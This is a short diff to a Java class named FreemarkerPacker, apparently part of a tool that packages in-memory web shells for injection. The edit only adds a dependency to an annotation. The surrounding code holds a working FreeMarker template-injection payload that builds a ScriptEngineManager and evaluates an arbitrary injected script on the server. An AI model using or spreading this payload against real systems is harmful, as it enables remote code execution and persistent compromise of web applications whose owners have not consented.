@@ -5,7 +5,7 @@ import org.leo.jmg.mem.packer.Packer;
 import org.leo.jmg.mem.packer.PackerMeta;
 import org.leo.jmg.mem.packer.PackerRegistry;
 
-@PackerMeta(name = "Freemarker", order = 100)
+@PackerMeta(name = "Freemarker", order = 100, dependencies = "DefaultScriptEngine")
 public class FreemarkerPacker implements Packer {
     String template = "${'freemarker.template.utility.ObjectConstructor'?new()('javax.script.ScriptEngineManager').getEngineByName('js').eval('{{script}}')}";
 
